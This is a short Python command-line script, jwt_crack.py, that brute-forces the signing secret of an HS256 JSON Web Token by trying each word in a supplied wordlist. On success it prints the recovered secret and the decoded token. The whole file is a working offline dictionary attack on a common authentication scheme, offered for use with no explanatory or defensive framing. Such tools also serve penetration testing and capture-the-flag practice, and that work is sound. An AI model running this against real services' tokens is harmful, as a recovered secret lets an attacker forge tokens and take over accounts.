import jwt
import sys

def crack_jwt(token, wordlist):
    with open(wordlist, 'r', encoding='latin-1') as file:
        for line in file:
            secret = line.strip()
            try:
                decoded = jwt.decode(token, secret, algorithms=['HS256'])
                print(f"Secret : {secret}")
                print(f"Decoded JWT: {decoded}")
                return
            except jwt.InvalidTokenError:
                continue
    print("Failed to crack the JWT with the provided wordlist.")

if len(sys.argv) != 3:
    print("Usage: python3 jwt_crack.py <jwt_token> <wordlist>")
    sys.exit(1)

token = sys.argv[1]
wordlist = sys.argv[2]
crack_jwt(token, wordlist)